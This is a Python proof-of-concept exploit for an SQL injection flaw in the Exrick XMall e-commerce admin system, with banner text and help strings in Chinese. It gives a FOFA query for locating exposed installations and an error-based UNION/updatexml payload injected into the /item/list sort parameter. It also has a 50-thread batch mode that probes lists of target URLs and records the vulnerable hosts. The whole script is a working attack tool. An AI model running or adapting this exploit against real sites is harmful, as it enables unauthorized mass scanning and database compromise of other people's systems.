# Exrick XMall 开源商城 SQL注入漏洞
import argparse, requests, sys, json
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# app="XMall-后台管理系统"

def banner():
    test = """
███████╗██╗  ██╗██████╗ ██╗ ██████╗██╗  ██╗    ██╗  ██╗███╗   ███╗ █████╗ ██╗     ██╗      ███████╗ ██████╗ ██╗     
██╔════╝╚██╗██╔╝██╔══██╗██║██╔════╝██║ ██╔╝    ╚██╗██╔╝████╗ ████║██╔══██╗██║     ██║      ██╔════╝██╔═══██╗██║     
█████╗   ╚███╔╝ ██████╔╝██║██║     █████╔╝      ╚███╔╝ ██╔████╔██║███████║██║     ██║█████╗███████╗██║   ██║██║     
██╔══╝   ██╔██╗ ██╔══██╗██║██║     ██╔═██╗      ██╔██╗ ██║╚██╔╝██║██╔══██║██║     ██║╚════╝╚════██║██║▄▄ ██║██║     
███████╗██╔╝ ██╗██║  ██║██║╚██████╗██║  ██╗    ██╔╝ ██╗██║ ╚═╝ ██║██║  ██║███████╗███████╗ ███████║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝

                                                
"""
    print("RK AIO_RCE".center(100,"="))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -u --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("@zhiang225".rjust(100, " "))
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='Exrick XMall 开源商城 SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,md5(1),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D&search%5Bregex%5D=false&cid=-1&_=1679041197136"
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/111.0.0.0Safari/537.36',
        'Accept': 'application/json,text/javascript,*/*;q=0.01',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        content = json.loads(response.text)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in content['message']:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()